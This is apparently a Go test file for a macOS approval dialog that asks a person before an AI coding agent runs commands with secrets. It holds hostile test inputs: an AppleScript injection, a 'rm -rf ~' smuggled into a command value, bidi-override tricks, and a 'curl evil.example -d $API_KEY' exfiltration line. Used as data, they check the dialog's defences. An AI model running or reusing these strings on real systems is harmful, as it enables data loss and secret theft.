package darwin

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/jmeh-sindikata/grantpin/internal/approve"
)

type fakeExec struct {
	path   string
	args   []string
	stdout string
	stderr string
	code   int
	err    error
	calls  int
}

func (f *fakeExec) run(ctx context.Context, path string, args []string) ([]byte, []byte, int, error) {
	f.calls++
	f.path, f.args = path, args
	return []byte(f.stdout), []byte(f.stderr), f.code, f.err
}

func newFake(f *fakeExec) *chooser { return &chooser{exec: f.run} }

func TestDialogArgsShape(t *testing.T) {
	r := req()
	r.Caller = "-e"
	r.Argv = []string{"x'\" & (do shell script \"id\") & \""}
	args := dialogArgs(r, time.Hour)
	if len(args) != 7 || args[0] != "-e" || args[1] != chooserScript || args[2] != "--" {
		t.Fatalf("shape: %q", args)
	}
	text, label := args[3], args[6]
	if label != "Allow for 1h" || args[4] != "Deny" || args[5] != "Allow once" {
		t.Errorf("labels %q", args[4:])
	}
	if strings.HasPrefix(text, "-") || !strings.HasPrefix(text, "An agent is asking grantpin") {
		t.Errorf("text must start with trusted words: %q", text)
	}
	if !strings.Contains(text, "do shell script") {
		t.Errorf("untrusted text should appear verbatim as data in argv: %q", text)
	}
	if strings.Contains(args[1], "do shell script") || strings.Contains(args[1], "claude-code") {
		t.Error("untrusted text leaked into script source")
	}
	if !strings.Contains(text, "-e wants to run") {
		t.Errorf("caller missing: %q", text)
	}
}

func TestDialogArgsNoTTL(t *testing.T) {
	args := dialogArgs(req(), 0)
	if args[6] != "" || strings.Contains(args[3], "Allow for") {
		t.Errorf("no TTL => no third button: %q", args)
	}
}

func TestScriptIsStaticAndHasRequiredShape(t *testing.T) {
	for _, want := range []string{
		"on run argv", "default button safeLabel", "cancel button safeLabel",
		"with icon caution", "giving up after 120", "{safeLabel, allowLabel}",
	} {
		if !strings.Contains(chooserScript, want) {
			t.Errorf("script missing %q", want)
		}
	}
}

func TestParseChoice(t *testing.T) {
	const f = "Allow for 1h"
	cases := []struct {
		in    string
		label string
		want  choice
	}{
		{"button returned:Allow once, gave up:false\n", f, choiceOnce},
		{"button returned:Allow for 1h, gave up:false\n", f, choiceFor},
		{"button returned:Deny, gave up:false\n", f, choiceDeny},
		{"button returned:, gave up:true\n", f, choiceDeny},
		{"button returned:Allow once, gave up:true\n", f, choiceDeny},
		{"button returned:allow once, gave up:false\n", f, choiceDeny},
		{"button returned:Allow once , gave up:false\n", f, choiceDeny},
		{"button returned:Allow for 2h, gave up:false\n", f, choiceDeny},
		{"button returned:Allow for 1h, gave up:false\n", "", choiceDeny}, // no such button offered
		{"xbutton returned:Allow once, gave up:false", f, choiceDeny},
		{"Allow once", f, choiceDeny},
		{"button returned:Allow once", f, choiceDeny},
		{"", f, choiceDeny},
		{"button returned:Allow once, gave up:false\nbutton returned:Deny, gave up:false", f, choiceDeny},
	}
	for _, c := range cases {
		if got := parseChoice(c.in, approve.KindRelease, c.label); got != c.want {
			t.Errorf("parseChoice(%q,%q)=%v want %v", c.in, c.label, got, c.want)
		}
	}
}

func TestChooserAsk(t *testing.T) {
	ctx := context.Background()

	f := &fakeExec{stdout: "button returned:Allow for 1h, gave up:false\n"}
	got, err := newFake(f).ask(ctx, req(), time.Hour)
	if err != nil || got != choiceFor {
		t.Fatalf("got %v %v", got, err)
	}
	if f.path != "/usr/bin/osascript" {
		t.Errorf("path %q must be absolute /usr/bin/osascript", f.path)
	}

	f = &fakeExec{stdout: "button returned:Allow once, gave up:false\n"}
	if got, err := newFake(f).ask(ctx, req(), time.Hour); err != nil || got != choiceOnce {
		t.Fatalf("got %v %v", got, err)
	}

	// Cancel button => osascript exits 1 with error -128: a Deny, not an error.
	f = &fakeExec{code: 1, stderr: "0:17: execution error: User canceled. (-128)\n"}
	if got, err := newFake(f).ask(ctx, req(), time.Hour); err != nil || got != choiceDeny {
		t.Fatalf("cancel: %v %v", got, err)
	}

	// Any other failure is an error, never an allow.
	f = &fakeExec{code: 1, stderr: "execution error: something else (-1743)"}
	if got, err := newFake(f).ask(ctx, req(), time.Hour); !errors.Is(err, ErrChooserFailed) || got != choiceDeny {
		t.Fatalf("failure: %v %v", got, err)
	}
	f = &fakeExec{err: errors.New("fork/exec: no such file")}
	if got, err := newFake(f).ask(ctx, req(), 0); !errors.Is(err, ErrChooserFailed) || got != choiceDeny {
		t.Fatalf("exec error: %v %v", got, err)
	}

	// Garbage output with exit 0 => Deny.
	f = &fakeExec{stdout: "hello"}
	if got, err := newFake(f).ask(ctx, req(), time.Hour); err != nil || got != choiceDeny {
		t.Fatalf("garbage: %v %v", got, err)
	}
}

func TestChooserAskCancelledContext(t *testing.T) {
	f := &fakeExec{stdout: "button returned:Allow once, gave up:false\n"}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	got, err := newFake(f).ask(ctx, req(), time.Hour)
	if !errors.Is(err, context.Canceled) || got != choiceDeny || f.calls != 0 {
		t.Fatalf("got %v %v calls=%d", got, err, f.calls)
	}
	// Cancelled while running: result discarded even if the fake "answered allow".
	ctx2, cancel2 := context.WithCancel(context.Background())
	c := &chooser{exec: func(ctx context.Context, p string, a []string) ([]byte, []byte, int, error) {
		cancel2()
		return []byte("button returned:Allow once, gave up:false\n"), nil, 0, nil
	}}
	got, err = c.ask(ctx2, req(), time.Hour)
	if !errors.Is(err, context.Canceled) || got != choiceDeny {
		t.Fatalf("mid-run cancel: %v %v", got, err)
	}
}

func TestAllowForLabel(t *testing.T) {
	if allowForLabel(0) != "" || allowForLabel(-1) != "" {
		t.Error("no label without TTL")
	}
	if allowForLabel(30*time.Minute) != "Allow for 30m" {
		t.Error("label")
	}
}

func TestLimitedBuffer(t *testing.T) {
	l := &limitedBuffer{max: 4}
	n, err := l.Write([]byte("abcdefgh"))
	if n != 8 || err != nil || l.buf.String() != "abcd" {
		t.Errorf("%d %v %q", n, err, l.buf.String())
	}
	_, _ = l.Write([]byte("zz"))
	if l.buf.String() != "abcd" {
		t.Error("exceeded max")
	}
}

func TestDialogArgsStateGrantScope(t *testing.T) {
	r := req()
	r.Argv = []string{"php", "artisan", "sync"}
	r.GrantCmdPrefix = []string{"php", "artisan"}
	r.GrantCwdPrefix = "/Users/me/projects/foo"
	args := dialogArgs(r, time.Hour)
	if !strings.HasSuffix(args[3], "\n\nAllow for 1h covers: php artisan … in /Users/me/projects/foo and subfolders.") {
		t.Errorf("text = %q", args[3])
	}
	if args[6] != "Allow for 1h" {
		t.Errorf("label = %q", args[6])
	}
	// No third button, no scope sentence.
	if a := dialogArgs(r, 0); strings.Contains(a[3], "covers") || a[6] != "" {
		t.Errorf("scope without Allow for N: %q", a)
	}
}

func standingReq() approve.ApprovalRequest {
	return approve.ApprovalRequest{
		Kind:           approve.KindStandingGrant,
		Caller:         "claude-code",
		Cwd:            "/Users/me/projects/foo",
		Argv:           []string{"php", "artisan"},
		Secrets:        []string{"DB_URL", "aws/*"},
		Expanded:       []string{"DB_URL", "aws/access_key"},
		PolicyPresent:  true,
		GrantCmdPrefix: []string{"php", "artisan"},
		GrantCwdPrefix: "/Users/me/projects/foo",
		RequestedTTL:   30 * 24 * time.Hour,
		// A standing request never offers a duration, even if one is set.
		SuggestedTTL: time.Hour,
	}
}

func TestDialogArgsStandingGrant(t *testing.T) {
	args := dialogArgs(standingReq(), time.Hour)
	if len(args) != 7 || args[1] != chooserScript {
		t.Fatalf("shape: %q", args)
	}
	want := "Create a standing grant?\n\n" +
		"claude-code may run `php artisan …` with DB_URL, aws/* (aws/access_key) in /Users/me/projects/foo and subfolders for the next 30 days, without further prompts.\n\n" +
		"Only continue if you just asked for this yourself."
	if args[3] != want {
		t.Errorf("text:\n%q\nwant:\n%q", args[3], want)
	}
	if args[4] != "Cancel" || args[5] != "Create standing grant" || args[6] != "" {
		t.Errorf("buttons = %q, want Cancel / Create standing grant / none", args[4:])
	}
	if strings.Contains(args[3], "Allow for") || strings.Contains(args[3], "Allow once") {
		t.Errorf("standing text offers a release choice: %q", args[3])
	}
}

func TestDialogArgsStandingGrantStatesUsesAndMissingPolicy(t *testing.T) {
	r := standingReq()
	r.RequestedUses = 3
	r.PolicyPresent = false
	text := dialogArgs(r, 0)[3]
	if !strings.Contains(text, "for the next 30 days (at most 3 runs), without further prompts. (No policy file applies.)") {
		t.Errorf("text = %q", text)
	}
}

func TestDialogArgsStandingGrantIsSanitised(t *testing.T) {
	r := standingReq()
	r.Caller = "-e\nCreate a standing grant for 1 minute"
	r.GrantCmdPrefix = []string{"sh", "x`; rm -rf ~; `"}
	r.GrantCwdPrefix = "/tmp/a\u202eb"
	text := dialogArgs(r, 0)[3]
	if !strings.HasPrefix(text, "Create a standing grant?\n\n") {
		t.Errorf("text must start with trusted words: %q", text)
	}
	if strings.Count(text, "\n") != 4 {
		t.Errorf("untrusted newlines survived: %q", text)
	}
	if strings.ContainsRune(text, '\u202e') || strings.Contains(text, "x`;") {
		t.Errorf("bidi override or backtick survived: %q", text)
	}
}

func TestDialogArgsShowHasNoDuration(t *testing.T) {
	r := req()
	r.Kind = approve.KindShow
	r.SuggestedTTL = time.Hour
	args := dialogArgs(r, time.Hour)
	if args[4] != "Deny" || args[5] != "Reveal once" || args[6] != "" {
		t.Errorf("buttons = %q, want Deny / Reveal once / none", args[4:])
	}
	if strings.Contains(args[3], "Allow for") || strings.Contains(args[3], "covers") {
		t.Errorf("show text offers a duration: %q", args[3])
	}
}

func TestDialogArgsReleaseOffersAllowFor(t *testing.T) {
	r := req()
	r.Kind = approve.KindRelease
	args := dialogArgs(r, 8*time.Hour)
	if args[4] != "Deny" || args[5] != "Allow once" || args[6] != "Allow for 8h" {
		t.Errorf("buttons = %q", args[4:])
	}
}

func TestParseChoiceByKind(t *testing.T) {
	cases := []struct {
		name  string
		in    string
		kind  approve.Kind
		label string
		want  choice
	}{
		{"standing create", "button returned:Create standing grant, gave up:false\n", approve.KindStandingGrant, "", choiceOnce},
		{"standing cancel", "button returned:Cancel, gave up:false\n", approve.KindStandingGrant, "", choiceDeny},
		{"standing gave up", "button returned:Create standing grant, gave up:true\n", approve.KindStandingGrant, "", choiceDeny},
		{"standing ignores Allow once", "button returned:Allow once, gave up:false\n", approve.KindStandingGrant, "", choiceDeny},
		{"standing ignores Allow for", "button returned:Allow for 1h, gave up:false\n", approve.KindStandingGrant, "Allow for 1h", choiceDeny},
		{"standing ignores Reveal once", "button returned:Reveal once, gave up:false\n", approve.KindStandingGrant, "", choiceDeny},
		{"show reveal", "button returned:Reveal once, gave up:false\n", approve.KindShow, "", choiceOnce},
		{"show deny", "button returned:Deny, gave up:false\n", approve.KindShow, "", choiceDeny},
		{"show ignores Allow once", "button returned:Allow once, gave up:false\n", approve.KindShow, "", choiceDeny},
		{"show never has a duration", "button returned:Allow for 1h, gave up:false\n", approve.KindShow, "Allow for 1h", choiceDeny},
		{"release ignores Create standing grant", "button returned:Create standing grant, gave up:false\n", approve.KindRelease, "Allow for 1h", choiceDeny},
		{"release ignores Reveal once", "button returned:Reveal once, gave up:false\n", approve.KindRelease, "", choiceDeny},
		{"release once", "button returned:Allow once, gave up:false\n", approve.KindRelease, "", choiceOnce},
	}
	for _, c := range cases {
		if got := parseChoice(c.in, c.kind, c.label); got != c.want {
			t.Errorf("%s: parseChoice(%q, %v, %q) = %v, want %v", c.name, c.in, c.kind, c.label, got, c.want)
		}
	}
}

func TestChooserAskStanding(t *testing.T) {
	f := &fakeExec{stdout: "button returned:Create standing grant, gave up:false\n"}
	got, err := newFake(f).ask(context.Background(), standingReq(), time.Hour)
	if err != nil || got != choiceOnce {
		t.Fatalf("got %v %v", got, err)
	}
	if f.args[4] != "Cancel" || f.args[5] != "Create standing grant" {
		t.Errorf("args = %q", f.args)
	}
	// The release button must not satisfy a standing prompt.
	f = &fakeExec{stdout: "button returned:Allow once, gave up:false\n"}
	if got, _ := newFake(f).ask(context.Background(), standingReq(), 0); got != choiceDeny {
		t.Errorf("Allow once answered a standing prompt: %v", got)
	}
}

func TestTTLForChoice(t *testing.T) {
	st := standingReq()
	rel := req()
	show := req()
	show.Kind = approve.KindShow
	cases := []struct {
		name    string
		req     approve.ApprovalRequest
		ch      choice
		offered time.Duration
		ttl     time.Duration
		allow   bool
	}{
		{"standing create is exactly the requested TTL", st, choiceOnce, 0, 30 * 24 * time.Hour, true},
		{"standing deny", st, choiceDeny, 0, 0, false},
		{"standing for is nonsense", st, choiceFor, time.Hour, 0, false},
		{"release once", rel, choiceOnce, time.Hour, 0, true},
		{"release for", rel, choiceFor, 8 * time.Hour, 8 * time.Hour, true},
		{"release for without an offer", rel, choiceFor, 0, 0, false},
		{"release deny", rel, choiceDeny, time.Hour, 0, false},
		{"show once has no ttl", show, choiceOnce, 0, 0, true},
		{"show for is nonsense", show, choiceFor, time.Hour, 0, false},
	}
	for _, c := range cases {
		ttl, allow := ttlForChoice(c.req, c.ch, c.offered)
		if ttl != c.ttl || allow != c.allow {
			t.Errorf("%s: got (%v, %v), want (%v, %v)", c.name, ttl, allow, c.ttl, c.allow)
		}
	}
}

func TestTTLNoChooserAndCancelTitle(t *testing.T) {
	c := newConfig([]Option{WithDefaultTTL(time.Hour)})
	st := standingReq()
	if got := c.ttlNoChooser(st); got != st.RequestedTTL {
		t.Errorf("standing without chooser = %v", got)
	}
	show := req()
	show.Kind = approve.KindShow
	if got := c.ttlNoChooser(show); got != 0 {
		t.Errorf("show without chooser = %v", got)
	}
	rel := req()
	rel.SuggestedTTL = 30 * time.Minute
	if got := c.ttlNoChooser(rel); got != 30*time.Minute {
		t.Errorf("release without chooser = %v", got)
	}
	if cancelTitleFor(approve.KindStandingGrant) != "Cancel" || cancelTitleFor(approve.KindShow) != "Deny" || cancelTitleFor(approve.KindRelease) != "Deny" {
		t.Error("cancel titles")
	}
}

func TestDialogArgsLowerTier(t *testing.T) {
	args := dialogArgs(lowerReq(), time.Hour)
	if len(args) != 7 || args[1] != chooserScript {
		t.Fatalf("shape: %q", args)
	}
	if args[3] != LowerTierText(lowerReq()) || !strings.HasPrefix(args[3], "Lower the protection of stripe/api_key from hardware to dialog?") {
		t.Errorf("text = %q", args[3])
	}
	if args[4] != "Cancel" || args[5] != "Lower" || args[6] != "" {
		t.Errorf("buttons = %q, want Cancel / Lower / none", args[4:])
	}
}

func TestLowerTierChoiceAndTTL(t *testing.T) {
	r := lowerReq()
	ok := "button returned:Lower, gave up:false\n"
	if got := parseChoice(ok, approve.KindLowerTier, ""); got != choiceOnce {
		t.Errorf("Lower = %v", got)
	}
	for _, in := range []string{
		"button returned:Cancel, gave up:false\n",
		"button returned:Lower, gave up:true\n",
		"button returned:Allow once, gave up:false\n",
		"button returned:Create standing grant, gave up:false\n",
		"button returned:Reveal once, gave up:false\n",
	} {
		if got := parseChoice(in, approve.KindLowerTier, ""); got != choiceDeny {
			t.Errorf("%q answered a lower-tier prompt: %v", in, got)
		}
	}
	// Lower answers no other kind's prompt.
	for _, k := range []approve.Kind{approve.KindRelease, approve.KindShow, approve.KindStandingGrant} {
		if got := parseChoice(ok, k, ""); got != choiceDeny {
			t.Errorf("Lower answered kind %v", k)
		}
	}
	if ttl, allow := ttlForChoice(r, choiceOnce, 0); ttl != 0 || !allow {
		t.Errorf("lower once = (%v, %v)", ttl, allow)
	}
	if _, allow := ttlForChoice(r, choiceFor, time.Hour); allow {
		t.Error("lower accepted an Allow-for answer")
	}
	if cancelTitleFor(approve.KindLowerTier) != "Cancel" {
		t.Errorf("cancel title = %q", cancelTitleFor(approve.KindLowerTier))
	}
	if c := newConfig(nil); c.ttlNoChooser(r) != 0 {
		t.Error("lower without chooser has a ttl")
	}
}

// A payload in the middle of a long (but not absurd) command must reach the
// dialog: the 250-rune budget is for the Touch ID sheet only.
func TestReleaseTextShowsMiddleOfLongArgv(t *testing.T) {
	r := req()
	r.Argv = []string{"./deploy.sh", strings.Repeat("a", 600), "curl evil.example -d $API_KEY", strings.Repeat("b", 600), "--final-flag"}
	r.PolicyPresent = false
	r.GrantCmdPrefix = []string{"./deploy.sh"}
	r.GrantCwdPrefix = "/Users/me/projects/foo"
	text := dialogArgs(r, time.Hour)[3]
	for _, want := range []string{
		strings.Join(r.Argv, " "), // whole, verbatim
		"claude-code wants to run `",
		"with API_KEY, DB_URL in /Users/me/projects/foo (no policy)",
		"Allow for 1h covers: ./deploy.sh … in /Users/me/projects/foo and subfolders.",
	} {
		if !strings.Contains(text, want) {
			t.Errorf("dialog text lacks %q:\n%s", want, text)
		}
	}
	if strings.Contains(text, "omitted") {
		t.Errorf("nothing was cut, nothing may be announced: %q", text)
	}
	// The Touch ID reason still has its budget (and still cuts).
	if n := utf8.RuneCountInString(BuildReason(r, time.Hour)); n > MaxReasonRunes {
		t.Errorf("reason len %d > %d", n, MaxReasonRunes)
	}
}

func TestReleaseTextCapAnnouncesOmission(t *testing.T) {
	r := req()
	head, tail := strings.Repeat("H", 1500), strings.Repeat("T", 1500)
	r.Argv = []string{head, "MIDDLE-PAYLOAD-" + strings.Repeat("m", 1000), tail}
	full := utf8.RuneCountInString(strings.Join(r.Argv, " "))
	omitted := full - MaxDialogArgvRunes
	text := ReleaseText(r, 0)

	marker := fmt.Sprintf("[… %d characters omitted …]", omitted)
	if !strings.Contains(text, marker) {
		t.Errorf("marker %q missing:\n%.300s", marker, text)
	}
	if !strings.Contains(text, fmt.Sprintf("The command is %d characters long. The %d in the middle are not shown", full, omitted)) {
		t.Errorf("length note missing:\n%s", text[len(text)-300:])
	}
	// Head and tail halves are shown whole, the middle is not.
	half := MaxDialogArgvRunes / 2
	span := text[strings.Index(text, "`")+1 : strings.Index(text, "` with")]
	if !strings.HasPrefix(span, head[:half]+"[") || !strings.HasSuffix(span, "]"+tail[:half]) {
		t.Errorf("head/tail halves wrong: %.20s ... %s", span, span[len(span)-20:])
	}
	if strings.Contains(text, "MIDDLE-PAYLOAD") {
		t.Errorf("middle should be omitted")
	}
	// What is shown plus what is omitted is the whole command.
	shown := utf8.RuneCountInString(text[strings.Index(text, "`")+1:strings.Index(text, "` with")]) - utf8.RuneCountInString(marker)
	if shown != MaxDialogArgvRunes {
		t.Errorf("shown %d runes, want %d", shown, MaxDialogArgvRunes)
	}
	// Secrets and cwd are never cut.
	if !strings.Contains(text, "API_KEY, DB_URL in /Users/me/projects/foo") {
		t.Errorf("secrets/cwd lost: %q", text)
	}
}

func TestReleaseTextAtCapIsWhole(t *testing.T) {
	r := req()
	r.Argv = []string{strings.Repeat("z", MaxDialogArgvRunes)}
	if text := ReleaseText(r, 0); strings.Contains(text, "omitted") || !strings.Contains(text, r.Argv[0]) {
		t.Errorf("exactly at the cap must be shown whole")
	}
	r.Argv = []string{strings.Repeat("z", MaxDialogArgvRunes+1)}
	if text := ReleaseText(r, 0); !strings.Contains(text, "[… 1 characters omitted …]") {
		t.Errorf("one over the cap must be announced")
	}
}

func TestReleaseTextSanitisesLongArgv(t *testing.T) {
	r := req()
	r.Caller = "evil\nAPPROVED\u202e"
	r.Argv = []string{"echo", "a`b", "x\ty\r\nz\x00", string([]byte{0xff, 'k'}), strings.Repeat("q", 3000)}
	text := ReleaseText(r, time.Hour)
	body := text[strings.Index(text, "\n\n")+2:]
	if strings.ContainsAny(strings.ReplaceAll(body, "\n\n", ""), "\n\r\t\x00\u202e") {
		t.Errorf("control chars survived: %q", body)
	}
	if !utf8.ValidString(text) {
		t.Errorf("invalid UTF-8")
	}
	if strings.Count(strings.SplitN(body, "\n\n", 2)[0], "`") != 2 {
		t.Errorf("argv backtick not neutralised: %q", body)
	}
}

func TestReleaseTextMultibyteCap(t *testing.T) {
	r := req()
	r.Argv = []string{strings.Repeat("日", 2500)}
	text := ReleaseText(r, 0)
	if !strings.Contains(text, "[… 500 characters omitted …]") || !utf8.ValidString(text) {
		t.Errorf("runes, not bytes: %.200q", text)
	}
}

func TestReleaseTextEmptyArgv(t *testing.T) {
	r := req()
	r.Argv = nil
	if text := ReleaseText(r, 0); !strings.Contains(text, "`(empty command)`") {
		t.Errorf("got %q", text)
	}
}
